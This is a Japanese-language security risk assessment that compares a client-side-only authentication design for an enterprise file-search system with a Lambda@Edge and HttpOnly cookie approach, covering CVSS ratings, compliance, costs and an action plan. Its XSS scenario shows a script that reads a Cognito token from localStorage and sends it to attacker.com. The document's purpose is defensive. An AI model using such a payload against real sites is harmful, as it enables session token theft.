# リスク評価マトリックス

## 現在の実装（静的エクスポート + クライアントサイド認証のみ）

| 脆弱性 | CVSS | 深刻度 | 発生可能性 | 影響度 | リスクレベル | 優先度 |
|--------|------|--------|-----------|--------|------------|--------|
| **静的ファイルへの直接アクセス** | 7.5 | HIGH | HIGH | HIGH | **CRITICAL** | P0 |
| **Local Storageトークン窃取** | 6.5 | MEDIUM | MEDIUM | HIGH | **HIGH** | P0 |
| **JavaScript無効化バイパス** | 7.0 | HIGH | LOW | HIGH | **MEDIUM** | P1 |
| **セキュリティヘッダー欠如** | 5.3 | MEDIUM | HIGH | MEDIUM | **MEDIUM** | P1 |
| **ブラウザキャッシュ情報漏洩** | 4.3 | MEDIUM | LOW | MEDIUM | **LOW** | P2 |

---

## 推奨実装（Lambda@Edge + HttpOnly Cookie）

| 脆弱性 | CVSS | 深刻度 | 発生可能性 | 影響度 | リスクレベル | 優先度 |
|--------|------|--------|-----------|--------|------------|--------|
| **静的ファイルへの直接アクセス** | 2.0 | LOW | LOW | LOW | **LOW** | - |
| **Local Storageトークン窃取** | 2.5 | LOW | LOW | LOW | **LOW** | - |
| **JavaScript無効化バイパス** | 2.0 | LOW | LOW | LOW | **LOW** | - |
| **セキュリティヘッダー欠如** | 0.0 | NONE | NONE | NONE | **NONE** | - |
| **Lambda@Edge設定ミス** | 6.0 | MEDIUM | LOW | MEDIUM | **LOW** | P2 |

---

## リスクレベル定義

### CRITICAL (9.0-10.0)
- 即座に悪用可能
- 深刻なデータ漏洩またはシステム侵害
- **デプロイ禁止** - 即時修正が必要

### HIGH (7.0-8.9)
- 悪用可能性が高い
- 重大なセキュリティ影響
- **1週間以内**に修正が必要

### MEDIUM (4.0-6.9)
- 一定の条件下で悪用可能
- 中程度のセキュリティ影響
- **1ヶ月以内**に修正が必要

### LOW (0.1-3.9)
- 悪用が困難
- 限定的な影響
- **次回メンテナンス時**に対応

### NONE (0.0)
- リスクなし

---

## コンプライアンス影響

| 規制 | 現在の実装 | 推奨実装 | コンプライアンスリスク |
|------|-----------|---------|---------------------|
| **GDPR** | ❌ 不適合 | ✅ 適合 | **HIGH** - Article 32違反の可能性 |
| **SOC 2** | ❌ 不適合 | ✅ 適合 | **HIGH** - CC6.1（論理的・物理的アクセス制御）違反 |
| **ISO 27001** | ❌ 不適合 | ✅ 適合 | **MEDIUM** - A.9.4.1（情報アクセス制限）違反 |

---

## 攻撃シナリオ別リスク評価

### シナリオ1: JavaScript無効化攻撃

**現在の実装:**
- 発生可能性: HIGH（攻撃者が簡単に実行可能）
- 影響度: HIGH（すべての保護が無効化）
- **リスクレベル: CRITICAL**

**推奨実装（Lambda@Edge）:**
- 発生可能性: LOW（サーバーサイドで防御）
- 影響度: LOW（認証チェックが機能）
- **リスクレベル: LOW**

---

### シナリオ2: XSS攻撃によるトークン窃取

**現在の実装（Local Storage）:**
```javascript
// 攻撃者が注入したスクリプト
<script>
  const token = localStorage.getItem('CognitoIdentityServiceProvider.xxx.idToken');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```
- 発生可能性: MEDIUM（XSS脆弱性が必要）
- 影響度: HIGH（永続的なアクセス権限取得）
- **リスクレベル: HIGH**

**推奨実装（HttpOnly Cookie）:**
- 発生可能性: LOW（JavaScriptからアクセス不可）
- 影響度: LOW（トークン窃取不可）
- **リスクレベル: LOW**

---

### シナリオ3: CSRF攻撃

**現在の実装:**
- 発生可能性: LOW（CORS制限あり）
- 影響度: MEDIUM
- **リスクレベル: MEDIUM**

**推奨実装（SameSite Cookie）:**
- 発生可能性: VERY LOW（SameSite=Strict）
- 影響度: LOW
- **リスクレベル: LOW**

---

### シナリオ4: ブルートフォース攻撃

**両実装共通:**
- Cognito側で保護（アカウントロックアウト）
- 発生可能性: LOW
- 影響度: LOW
- **リスクレベル: LOW**

---

## ビジネスインパクト分析

### データ漏洩が発生した場合

| 項目 | 推定コスト | 備考 |
|------|----------|------|
| **GDPR罰金** | 最大 €20,000,000 または全世界年間売上高の4% | Article 83 |
| **SOC 2監査失敗** | $50,000 - $200,000 | 再監査費用 |
| **インシデント対応** | $100,000 - $500,000 | 調査・修復・通知 |
| **レピュテーション損失** | 測定不可 | 顧客信頼の喪失 |
| **訴訟リスク** | $500,000+ | 集団訴訟の可能性 |

**合計推定コスト: $650,000 - $1,200,000 以上**

---

## リスク軽減のROI分析

### Lambda@Edge実装コスト

| 項目 | コスト |
|------|-------|
| **初期実装** | 40時間 × $100/h = $4,000 |
| **Lambda@Edge実行コスト** | $0.60/100万リクエスト |
| **CloudWatch Logs** | $0.50/GB |
| **月間運用コスト** | ~$50-100 |

**年間コスト: ~$600-1,200**

### ROI計算

```
潜在的損失回避額: $650,000 - $1,200,000
実装コスト: $4,000 + ($100 × 12) = $5,200

ROI = (損失回避額 - 実装コスト) / 実装コスト × 100
    = ($650,000 - $5,200) / $5,200 × 100
    = 12,400%
```

**結論: Lambda@Edge実装は極めて費用対効果が高い**

---

## 推奨アクションプラン

### フェーズ1: 緊急対応（1週間以内）

1. **Lambda@Edge認証チェックの実装** (P0)
   - 工数: 16時間
   - 担当: インフラエンジニア
   - 成果物: Lambda@Edge関数、Terraform設定

2. **HttpOnly Cookieへの移行** (P0)
   - 工数: 8時間
   - 担当: フロントエンドエンジニア
   - 成果物: 更新されたAmplify設定

3. **セキュリティヘッダーの追加** (P1)
   - 工数: 4時間
   - 担当: インフラエンジニア
   - 成果物: Lambda@Edge Origin Response関数

### フェーズ2: 検証（1週間）

4. **セキュリティテスト実施** (P1)
   - 工数: 16時間
   - 担当: QAエンジニア
   - 成果物: テストレポート

5. **ペネトレーションテスト** (P1)
   - 工数: 8時間
   - 担当: セキュリティエンジニア
   - 成果物: 脆弱性診断レポート

### フェーズ3: 本番デプロイ（1日）

6. **本番環境デプロイ** (P0)
   - 工数: 4時間
   - 担当: DevOpsエンジニア
   - 成果物: デプロイ完了報告

7. **監視・アラート設定** (P1)
   - 工数: 8時間
   - 担当: インフラエンジニア
   - 成果物: CloudWatch Dashboard、アラート設定

**合計工数: 64時間（約8営業日）**
**合計コスト: 64 × $100 = $6,400**

---

## 意思決定マトリックス

### オプション1: 現状維持（静的エクスポート + クライアントサイド認証のみ）

| 項目 | 評価 |
|------|------|
| **セキュリティレベル** | ❌ 不十分（CVSS 7.5） |
| **コンプライアンス** | ❌ 不適合（GDPR、SOC 2） |
| **実装コスト** | ✅ $0 |
| **運用コスト** | ✅ $0 |
| **リスクコスト** | ❌ $650,000+ |
| **ビジネスリスク** | ❌ CRITICAL |

**推奨度: 0/10 - デプロイ禁止**

---

### オプション2: Lambda@Edge + HttpOnly Cookie（推奨）

| 項目 | 評価 |
|------|------|
| **セキュリティレベル** | ✅ 高い（CVSS 2.0） |
| **コンプライアンス** | ✅ 適合 |
| **実装コスト** | ⚠️ $6,400 |
| **運用コスト** | ✅ $100/月 |
| **リスクコスト** | ✅ 最小化 |
| **ビジネスリスク** | ✅ LOW |

**推奨度: 10/10 - 強く推奨**

---

### オプション3: クライアントサイド認証強化 + HttpOnly Cookie（次善策）

| 項目 | 評価 |
|------|------|
| **セキュリティレベル** | ⚠️ 中程度（CVSS 4.5） |
| **コンプライアンス** | ⚠️ 部分的に適合 |
| **実装コスト** | ✅ $1,600 |
| **運用コスト** | ✅ $0 |
| **リスクコスト** | ⚠️ $100,000+ |
| **ビジネスリスク** | ⚠️ MEDIUM |

**推奨度: 5/10 - 一時的な措置として許容可能**

---

## 🚨 最終推奨事項

### 企業向けファイル検索システムとして

**現在の実装は企業向けシステムとして不適切です。**

以下の理由により、Lambda@Edge認証チェックの実装を**強く推奨**します：

1. **セキュリティ**: CVSS 7.5 → 2.0 に改善
2. **コンプライアンス**: GDPR、SOC 2に適合
3. **ROI**: 12,400%の投資対効果
4. **リスク軽減**: 潜在的損失 $650,000+ を回避
5. **実装期間**: 8営業日で完了可能

**デプロイ判断:**
- ✅ Lambda@Edge実装後 → デプロイ承認
- ❌ 現状のまま → **デプロイ禁止**

**承認者:**
- セキュリティ責任者
- プロジェクトマネージャー
- 法務部門（GDPRコンプライアンス）

---

## 📞 エスカレーション

セキュリティインシデントが発生した場合：

1. **即時対応**: インシデント対応チームに連絡
2. **72時間以内**: GDPR Article 33に基づく当局への報告
3. **遅滞なく**: 影響を受けるユーザーへの通知（Article 34）

**連絡先:**
- セキュリティ責任者: [メールアドレス]
- インシデント対応チーム: [メールアドレス]
- DPO（データ保護責任者）: [メールアドレス]
